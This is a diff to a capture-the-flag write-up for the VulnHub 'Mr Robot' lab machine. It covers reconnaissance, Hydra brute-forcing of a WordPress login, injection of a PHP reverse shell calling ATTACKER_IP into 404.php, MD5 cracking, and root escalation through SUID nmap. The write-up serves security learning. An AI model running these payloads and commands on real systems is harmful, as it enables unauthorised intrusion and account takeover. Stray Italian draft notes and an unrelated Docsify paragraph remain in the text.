@@ -1,5 +1,5 @@
 # Attacking Mr Robot - VulnHub
-
+![nmrrobot](images/mr-robot.jpg) 
 ## 1. Introduction
 This write-up details the steps I took to solve the MR Robot vulnerable machine from VulnHub. The VM is inspired by the popular TV show "Mr. Robot" and contains three flags, each of increasing difficulty. The primary goal is to capture all three flags while demonstrating common hacking techniques such as brute-force attacks, hash cracking, and privilege escalation.
 
@@ -23,44 +23,146 @@ In this scenario, the threat model assumes that the attacker is on the same loca
   - Python: Used to spawn an interactive shell.
 
 
-
-
 ## Reconnaissance
-### Gathering Victim Host Information
+### Gathering Information
 
-Descrizione netdiscover:
+The first step was to discover the target machine's IP address on the local network. I used netdiscover, a tool designed for ARP scanning, which helps identify live hosts within a subnet:
 
-```sudo netdiscover -r 192.168.227.0/24```
+```
+netdiscover -r 192.168.227.0/24
+```
 
 ![netdiscover](images/netdiscover.png)  
 
 
-descrizione nmap
+This revealed the IP address of the MR Robot machine as 192.168.227.7. With this information, I proceeded with Nmap to identify the open ports and services running on the target:
 
-```nmap 192.168.227.7 -sV -T4 -oA nmap-scan -open```
+```
+nmap 192.168.227.7 -sV -T4 -oA nmap-scan -open
+```
 
 Output:
 ![nmap](images/nmap.png)
+The scan revealed a web server running on port 80. I navigated to the web page to investigate further:
+
+![webserver](images/webserver.png)
 
 DIRB
-
-```sudo dirb http://192.168.227.7```
+Since the target was running a web server, the next logical step was to search for hidden directories that might reveal sensitive information. I used Dirb to perform a directory brute-force attack:
+```
+dirb http://192.168.227.7
+```
 
 Output:
-![nmap](images/dirb-start.png)
-![nmap](images/dirb-end.png)
-## 
+![dirb-start](images/dirb-start.png)
+![dirb-end](images/dirb-end.png)
+The Dirb scan uncovered several directories, particularly ones related to WordPress, such as /wp-admin, confirming the target was running a WordPress CMS. Additionally, robots.txt was discovered, which is a common file used to instruct web crawlers about which parts of the website should not be indexed.
 
-![nmap](images/1flag.png)
+Navigating to the file ```http://192.168.227.7/robots.txt``` revealed some crucial information:
+![1flag](images/1flag.png)
+
+The dile fsocity.dic reveled to be a wordlist file containing a large number of words, which would later prove useful in brute-force attacks. The file
+key-1-of-3.txt contains instead the first flag, marking the initial step in the challenge.
+
+![1key](images/1key.png)
 
 
-#### First key:
-![nmap](images/1key.png)
+## Brute Force Attack
+Once I discovered the WordPress site was running, I attempted to log in by navigating to http://192.168.227.7/wp-login.php. Without knowing the correct credentials, I used Burp Suite to intercept and analyze the HTTP POST requests sent when trying to log in with incorrect credentials.
+
+![burp](images/burp.png)
+
+By sending a fake username and password combination, I observed the error message returned by the server. The message clearly stated "Invalid username" when the username was incorrect, allowing me to focus the brute-force attack on discovering valid usernames first.
+
+![usr](images/usr.png)
+
+The error message and the structure of the HTTP POST request provided valuable insights for building the brute-force attack. The request included two key parameters: log for the username and pwd for the password. Using this information, I could systematically attempt different usernames while ignoring the password field for now.
+
+Before proceeding with the brute-force attack, I first needed to filter the fsocity.dic wordlist. The file contained over 800,000 entries, but many of them were duplicates. To make the brute-force process more efficient, I removed the duplicates by using the following commands: 
+```
+sort fsocity.dic | uniq > fs-list
+```
+This reduced the wordlist from over 800,000 entries to just over 11,000 unique entries.
+
+With the filtered fsocity.dic wordlist in hand, I proceeded to brute-force the login credentials for the WordPress admin panel. First, I needed to find a valid username by testing the wordlist using Hydra:
+
+```
+hydra -L fs-list -p test 192.168.227.7 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
+```
+
+![hydra1](images/hydra-1.png)
+
+The brute force process successfully identified elliot as a valid username. 
+I then attempted to brute-force elliot's password using the same fsocity.dic wordlist. This time, I used the "The password you entered for the username" error message to filter out incorrect passwords. 
+
+![psw](images/psw.png)
+
+I ran the following command:
+```
+hydra -l elliot -P fs-list 192.168.227.7 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
+```
+![hydra2](images/hydra-2.png)
+
+This revealed elliot's password: ER28-0652. With these credentials, I was able to log in to the WordPress admin panel.
+
+## Exploitation
+After successfully logging into the WordPress admin panel as elliot, I moved to the Appearance → Theme Editor section, which allows the administrator to edit theme files directly from the WordPress dashboard. One of the theme files available for editing was 404.php, a file that is responsible for handling 404 error pages (pages that do not exist).
+
+### PHP Reverse Shell Injection:
+
+To gain remote access to the target system, I decided to inject a PHP reverse shell into the 404.php template. This reverse shell script allows me to execute commands on the server remotely once triggered by visiting a non-existent page on the site.
+
+The reverse shell script was obtained from PentestMonkey, a well-known and trusted source for penetration testing tools. 
+
+I copied the raw PHP reverse shell code from the repository and replaced the content of 404.php with this script. Before injecting the code, I modified the following variables in the PHP script to match my attacking machine's IP address and a port of my choice:
+
+$ip: Set to the IP address of my attacking machine.
+$port: Set to 7777, the port I would use to listen for incoming connections.
+This is the basic structure of the reverse shell code that was injected:
+
+php
+Copia codice
+<?php
+$ip = 'ATTACKER_IP';  // Replace with your IP address
+$port = 7777;  // Replace with your chosen port number
+$socket = fsockopen($ip, $port);
+exec('/bin/sh -i <&3 >&3 2>&3');
+?>
+Triggering the Reverse Shell
+Once the reverse shell was injected into 404.php, I triggered the payload by visiting a non-existent page on the target website (e.g., http://192.168.227.7/nonexistentpage). Since the 404.php file handles all requests for non-existent pages, this executed the reverse shell code.
+
+Establishing a Reverse Shell with Netcat
+To capture the reverse shell, I set up a Netcat listener on my attacking machine to wait for incoming connections. I used the following command to listen on port 7777:
+
+bash
+Copia codice
+nc -lnvp 7777
+-l: Tells Netcat to listen for incoming connections.
+-n: Disables DNS resolution.
+-v: Enables verbose mode.
+-p 7777: Specifies the port on which to listen.
+Netcat Listener Output: Once the PHP reverse shell was triggered by visiting the non-existent page, a connection was established, and I gained remote shell access to the target machine.
+
+Exploring the File System
+With shell access to the system, I began exploring the file system. After navigating to the /home/robot directory, I found two files of interest:
+
+key-2-of-3.txt: This file contained the second flag, but I was unable to read it due to permission restrictions.
+password.raw-md5: This file contained an MD5 hashed password, which I suspected belonged to the user robot.
+At this point, I needed to escalate my privileges in order to read the second flag.
 
 
-## Brute Force
-![nmap](images/usr.png)
-![nmap](images/psw.png)
+
+![php-404](images/php-404.png)
+
+```
+nc -lnvp 7777
+```
+![netcat](images/netcat.png)
+
+dopo aver fatto partire la reverse shell, faccio un ls e vedo le cartelle, provo ad entrare in alcune ed entro in robot. trovandoci due files:
+![ls](images/ls-to-robot.png)
+
+la seconda chiave e un altro file. quando cerco di aprire il file, non mi lascia per privilegi. quindi cerco di aumentare i privilegi.
 
 
 ## Privilege Escalation
@@ -76,7 +178,7 @@ john --format=raw-md5 password.raw-md5 --wordlist=/usr/share/wordlists/rockyou.t
 ```
 
 John the Ripper Output:
-
+![ls](images/john.png)
 ```
 password: abcdefghijklmnopqrstuvwxyz
 ```
@@ -87,12 +189,16 @@ I switched to the user robot using the cracked password:
 su robot
 Password: abcdefghijklmnopqrstuvwxyz
 ```
+
+ho lanciato una spawn shell con python  e sono riuscita ad ottenere la seconda chiave.
+
+
 Once logged in as robot, I retrieved the second flag:
-
-
 ```
 cat /home/robot/key-2-of-3.txt
 ```
+![ls](images/py.png)
+
 
 ### Root Privilege Escalation
 To escalate privileges to root, I searched for SUID binaries, which allow files to be executed with elevated privileges:
@@ -100,6 +206,7 @@ To escalate privileges to root, I searched for SUID binaries, which allow files 
 ```
 find / -perm -u=s -type f 2>/dev/null
 ```
+![ls](images/find.png)
 
 Among the results, I found Nmap with the SUID bit set. The version of Nmap installed on the system supported interactive mode, which allows commands to be executed as root.
 
@@ -107,11 +214,14 @@ Among the results, I found Nmap with the SUID bit set. The version of Nmap insta
 nmap --interactive
 !sh
 ```
+![ls](images/nmap-interactive.png)
 
 I spawned a root shell and captured the final flag:
 ```
 cat /root/key-3-of-3.txt
 ```
+![ls](images/root-3.png)
+
 (images/cyber-security.jpg)
 
 [Docsify](https://docsify.js.org/#/) can generate article, portfolio and documentation websites on the fly. Unlike Docusaurus, Hugo and many other Static Site Generators (SSG), it does not generate static html files. Instead, it smartly loads and parses your Markdown content files and displays them as a website.
